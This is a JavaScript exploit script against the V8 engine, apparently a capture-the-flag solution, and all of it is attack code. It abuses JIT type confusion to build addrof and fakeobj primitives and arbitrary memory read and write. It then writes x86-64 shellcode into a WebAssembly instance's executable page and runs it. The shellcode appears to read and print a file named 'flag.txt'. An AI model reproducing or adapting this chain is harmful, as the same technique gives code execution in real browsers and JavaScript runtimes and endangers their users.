var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function vuln(a){
	val = a[0];
	return val;
}
function map_leak(a){
	val = a[0] + a[1];
	return val;
}
nn = [1.1,2.2]
function vuln1(o,z){
	nn[0] = z
	o[0] = z
	nn[1] = o
	return o[0]
}

o2 = {x:1337}
o3 = {x:o2}
l = [1.1,2.2]
obj_arr = [{"x":1}]
function setfloat(arr,val){
	l[0] = arr;
	arr[0] = val;
	l[0] = 0;
	return arr[0];
}

function addrof(o){
	a = ftoi(vuln([o,0])) & 0xffffffffn
	return a
}

float_arr = [1.1,2.2]
obj = {"x":10}
for (let i = 0; i < 10000; i++) {
	    console.log(vuln(float_arr));
}
for (let i = 0; i < 100000; i++){
	vuln(float_arr);
}
for (let i = 0; i < 300000; i++){
	map_leak(float_arr)
}
for (let i = 0; i < 10000; i++){
	setfloat(float_arr,1.1)
}
console.log("warmed up setfloat")
for (let i = 0; i < 30000; i++){	
	setfloat(float_arr,1.2);
}
function get_map(){
	find_map = [obj];
	return BigInt(ftoi(map_leak([find_map,0])))
}
obj_map = get_map() & 0xffffffffn
console.log("OBJ_Map " + obj_map.toString(16))
prop_obj_map = get_map()
float_array_map = prop_obj_map -0x50n
function fakeobj(addr){
	map = obj_map << 32n;
	to_write = map + addr;
	setfloat(obj_arr,itof(to_write));
	return obj_arr[0];
}
float_map = obj_map - 0x50n
var arr2 = [itof(float_array_map), 1.1, 2.2, 3.3];

function arbread(addr) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr3 = [itof(float_array_map),1.1,2.2,3.3];
    arr3[1] = itof((2n << 32n) + addr - 8n);
    console.log(arr3)
    var frake = fakeobj(addrof(arr3)-0x20n);
    return ftoi(frake[0]);
}
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
leaker = addrof(wasm_instance);
function why(){
	return arbread(leaker+0x68n);
}
rwx_page = why();





function arb_write(addr, val) //pass in Number and Number, returns nothing
{	var arb_rw_arr = [itof(float_array_map), 1.2, 1.3, 1.4];
        addr = BigInt(addr);
	var fake = fakeobj(BigInt(addrof(arb_rw_arr)) - 0x20n);
    	arb_rw_arr[1] = itof(BigInt("0x2000000000") + addr - 0x8n);
    	fake[0] = itof(BigInt(val));
}


function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x14n;
    arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}
shellcode = [0x41c0314d, 0x66bf4950, 0x2e67616c, 0x41747874, 0xe7894857, 0x48f63148, 0xc748d231, 0x2c0, 0x48050f00, 0xc748c789, 0xc0, 0xe6894800, 0x64c2c748, 0xf000000, 0xc0c74805, 0x1, 0x2c7c748, 0x48000000, 0xc748e689, 0x64c2, 0x50f00]

console.log("[*] Copying shellcode to rwx page")
console.log("[*] rwx @ 0x" + rwx_page.toString(16))
copy_shellcode(rwx_page, shellcode);
console.log("[*] Executing shellcode...");
f();
